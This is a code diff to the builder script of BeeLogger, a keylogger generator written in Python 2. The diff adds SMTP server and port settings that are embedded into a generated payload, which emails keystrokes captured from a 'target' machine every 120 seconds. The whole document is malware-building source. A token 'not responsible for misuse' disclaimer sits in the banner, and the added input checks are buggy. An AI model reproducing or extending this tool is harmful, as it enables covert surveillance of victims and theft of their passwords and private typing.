@@ -7,18 +7,30 @@
 import os
 import sys
 import time
+BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 if not os.geteuid() == 0:
     sys.exit('BeeLogger must be run as root')
 def clear():
     os.system('clear')
 def begin():
     os.system('sudo rm -Rf dist')
+    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
+    gh = raw_input('\nType email server (ex: \'smtp.gmail.com\'): ')
+    if len(gh) != 1 or 'smtp' not in gh:
+        print "\n{0} [!] Please use a valid smtp server.{1}".format(RED, END)
+        begin()
+    ghp = raw_input('\nType email server port (ex: \'587\'): ')
+    if len(gh) != 1:
+        print "\n{0} [!] Please type a valid smtp server port.{1}".format(RED, END)
+        begin()
     email = raw_input('Type your email to receive logs: ')
     epass = raw_input('Type your email password: ')
     print '\n'
     print '[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
     print '\n   email: ' + email
     print '   password: ' + epass 
+    print '   smtp: ' + gh
+    print '   port: ' + ghp
     print '\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
     print '\n'    
     ask = raw_input('These info above are correct? (y/n) :')
@@ -30,6 +42,8 @@ def begin():
     o = template.read()
     payload = '#/usr/bin/python\n'
     payload += '# -*- coding: utf-8 -*-\n'
+    payload += 'GH = ' + "'" + gh + "'" + '\n'
+    payload += 'GHP = ' + "'" + ghp + "'" + '\n'
     payload += 'EEMAIL = ' + "'" + email + "'" + '\n'
     payload += 'EPASS = ' + "'" + epass + "'" + '\n'
     payload += str(o)
@@ -39,40 +53,27 @@ def begin():
     template.close()
 def warn():
     sys.stdout.write(YELLOW + '''
-              %          %                   :::
-               %          %                ::::::
-            %%%%%%  %%%%%%%%%            ::::::::
-         %%%%%ZZZZ%%%%%%   %%%ZZZZ     ::::::::::         ::::::
-        %%%ZZZZZ%%%%%%%%%%%%%%ZZZZZZ  :::::::::::    :::::::::::::::::
-        ZZZ%ZZZ%%%%%%%%%%%%%%%ZZZZZZZ::::::::::***:::::::::::::::::::::
-     ZZZ%ZZZZZZ%%%%%%%%%%%%%%ZZZZZZZZZ::::::***:::::::::::::::::::::::
-   ZZZ%ZZZZZZZZZZ%%%%%%%%%%ZZZZZZ%ZZZZ:::***:::::::::::::::::::::::
-  ZZ%ZZZZZZZZZZZZZZZZZZZZZZZ%%%%% %ZZZ:**::::::::::::::::::::::
- ZZ%ZZZZZZZZZZZZZZZZZZZ%%%%% | | %ZZZ *:::::::::::::::::::
- Z%ZZZZZZZZZZZZZZZ%%%%%%%%%%%%%%%ZZZ::::::::::::::::::::::::::
-  ZZZZZZZZZZZ%%%%%ZZZZZZZZZZZZZZZZZ%%%%:::ZZZZ:::::::::::::::::  #BeeLogger
-    ZZZZ%%%%%ZZZZZZZZZZZZZZZZZZ%%%%%ZZZ%%ZZZ%ZZ%%*:::::::::::
-       ZZZZZZZZZZZZZZZZZZ%%%%%%%%%ZZZZZZZZZZ%ZZ%:::*:::::::
-       *:::%%%%%%%%%%%%%%%%%%%%%%%ZZZZZZZZZZ%%%*::::*::::
-     *:::::::%%%%%%%%%%%%%%%%%%%%%%%ZZZZZ%%      *:::Z
-    **:ZZZZ:::%%%%%%%%%%%%%%%%%%%%%%%%%%%ZZ      ZZZZZ
-   *:ZZZZZZZ       %%%%%%%%%%%%%%%%%%%%%ZZZZ    ZZZZZZZ
-  *::::ZZZZZZ         %%%%%%%%%%%%%%%ZZZZZZZ      ZZZ
-   *::ZZZZZZ           Z%%%%%%%%%%%ZZZZZZZ%%
-     ZZZZ              ZZZZZZZZZZZZZZZZ%%%%%''' + RED + '''  # Disclaimer Alert #''' + YELLOW +  ''' 
-                      %%%ZZZZZZZZZZZ%%%%%%%%''' + WHITE + '''  Not Responsible For Misuse ''' + YELLOW + '''
-                     Z%%%%%%%%%%%%%%%%%%%%%''' + WHITE + '''  And For Illegal Purposes.''' + YELLOW + '''
-                     ZZ%%%%%%%%%%%%%%%%%%%''' + WHITE + ''' Use it just for''' + RED + ''' WORK''' + WHITE + ''' or ''' + RED + '''EDUCATIONAL''' + WHITE + ''' !
-''')
 
-BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+              \     /
+          \    o ^ o    /          TO STOP SEND LOGS JUST 
+            \ (     ) /                    DISABLE IT ON 
+ ____________(%%%%%%%)____________                 TARGET IN MSCONFIG !
+(     /   /  )%%%%%%%(  \   \     )
+(___/___/__/           \__\___\___)     https://github.com/4w4k3/BeeLogger
+   (     /  / (%%%%%%) \  \     ) 
+    (__/___/   (%%%%)  \___\__)                 
+''' + RED + '''       [ Disclaimer Alert ]''' + YELLOW +  ''' 
+''' + WHITE + '''   Not Responsible For Misuse ''' + YELLOW + '''
+''' + WHITE + '''      or Illegal Purposes.''' + YELLOW + '''
+''' + WHITE + ''' Use it just for''' + RED + ''' WORK''' + WHITE + ''' or ''' + RED + '''EDUCATIONAL''' + WHITE + ''' !
+''')
 
 def heading():
     os.system('clear')
     sys.stdout.write(YELLOW + '''
 
                 .' '. I BEE YOU  __
-       .        .   .          \(__\_/             Version: 2.0
+       .        .   .          \(__\_/             Version: 2.2
         .         .         . -{{#(|8)
           ' .  . ' ' .  . '    /(__/ \      by:''' + WHITE + ' Alisson Moretto (' + YELLOW + '4w4k3' + WHITE + ')' + '\n' + '\n' + END) 
     print ' {0}[{1}K{0}]{1} Generate Keylogger  {0}[{1}U{0}]{1} Update  {0}[{1}Q{0}]{1} Quit  '.format(YELLOW, WHITE) + '\n'
@@ -83,7 +84,7 @@ def option():
 def main():
     clear()
     warn()
-    raw_input('                                                PRESS [ENTER] TO CONTINUE')
+    raw_input('\nPRESS [ENTER] TO CONTINUE')
     clear()
     heading()
     try:
@@ -97,7 +98,7 @@ def main():
                 raise SystemExit
             if choice.upper() == 'K':
                 option()
-                print '\n {0}WARNING: Enable access to less secure apps on your gmail account.{1}  \n -> https://www.google.com/settings/security/lesssecureapps'.format(RED, END)
+                print '\n {0}WARNING: Enable access to less secure apps on your email account.{1}  \n -> RECOMMENDED: \n* GMAIL * https://www.google.com/settings/security/lesssecureapps'.format(RED, END)
                 print '\n NOTE: Don\'t use your personal email, make a dedicated.'
                 print '\n {0}This keylogger send logs when logs > 50 chars or each 120 seconds.{1}'.format(BLUE, END)
             if choice.upper() == '6':
